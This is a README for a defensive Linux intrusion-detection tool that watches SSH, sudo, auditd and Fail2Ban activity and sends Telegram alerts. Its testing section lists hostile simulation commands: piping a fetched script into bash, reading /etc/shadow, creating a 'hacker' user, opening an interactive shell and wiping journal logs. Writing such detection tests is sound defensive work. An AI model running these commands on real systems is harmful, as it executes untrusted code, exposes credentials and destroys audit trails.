# Linux Endpoint Detection & Alerting System (HIDS)
A lightweight Host-Based Intrusion Detection System (HIDS) for Linux that monitors logs in real time, detects suspicious activities, correlates multi-stage attacks, and sends alerts via Telegram.

## Features
### Real-time Monitoring
* SSH authentication (success/failure)
* Sudo / privilege escalation
* User account modifications
* Sensitive file access (/etc/shadow, /root, SSH keys)
### Threat Detection (MITRE ATT&CK)
*Brute force attacks (T1110)
*Valid account abuse (T1078)
*Privilege escalation (T1068)
*Persistence (T1053, T1098)
*Credential access (T1003)
*Defense evasion (T1070)
*Recon & suspicious commands
### Correlation Engine
Detects multi-stage attacks
(Brute force → Successful login)
### Automated Response Validation
Integration with Fail2Ban (IP banning)
### Alerting
Telegram Bot notifications

## Architecture
```
journalctl + auditd + fail2ban logs
            ↓
        Detection Engine (Python)
            ↓
     Correlation Logic (State-based)
            ↓
         Alerting (Telegram)
            ↓
     Response (Fail2Ban Ban) 
```
### Tech Stack
Python
Linux (journalctl, auditd)
Fail2Ban
Telegram Bot API

## Setup & Installation
1. Install Dependencies
```
sudo apt update
sudo apt install openssh-server fail2ban auditd python3-pip -y
pip3 install requests
```
2. Enable Services
```
sudo systemctl enable ssh
sudo systemctl enable fail2ban
sudo systemctl enable auditd

sudo systemctl start ssh
sudo systemctl start fail2ban
sudo systemctl start auditd
```
3. Configure Fail2Ban

`sudo nano /etc/fail2ban/jail.local`

[sshd]
enabled = true
maxretry = 5
findtime = 120
bantime = 300

Restart:

`sudo systemctl restart fail2ban`
4. Configure auditd Rules
`sudo nano /etc/audit/rules.d/audit.rules`
```
-a always,exit -F arch=b64 -S execve -k exec_log
-a always,exit -F arch=b32 -S execve -k exec_log

-w /etc/shadow -p rwxa -k shadow_access
-w /root -p rwxa -k root_access
-w /home/*/.ssh/authorized_keys -p rwxa -k ssh_key_access
```
Load rules:
```
sudo augenrules --load
sudo systemctl restart auditd
```

6. Telegram Setup
*Create bot via @BotFather
*Get TOKEN
*Get CHAT ID

Update script:
```
TELEGRAM_TOKEN = "YOUR_TOKEN"
CHAT_ID = "YOUR_CHAT_ID"
```
### Usage

`sudo python3 monitor.py`

### Testing & Simulation

Use another machine (recommended) to simulate attacks:

`ssh testuser@<KALI_IP>`

### Test Commands
```
# SSH Brute Force
ssh testuser@<KALI_IP>  # wrong password multiple times

# SSH Login Success
ssh testuser@<KALI_IP>  # correct password
 
# Invalid User
ssh fakeuser@<KALI_IP>

# Sudo Usage
sudo ls

# User Creation
sudo useradd hacker

# Sensitive File Access
sudo cat /etc/shadow

# Root Access
sudo ls /root

# Suspicious Commands
bash -i
curl http://example.com | bash

# Recon Commands
uname -a
ip a
ps aux
```
### Log Clearing
`sudo journalctl --vacuum-time=1s`
### Fail2Ban Management
Check Status
`sudo fail2ban-client status sshd`
### Unban IP
`sudo fail2ban-client set sshd unbanip <IP>`
### Detection Flow
`Logs → Detection → Correlation → Alert → Response`
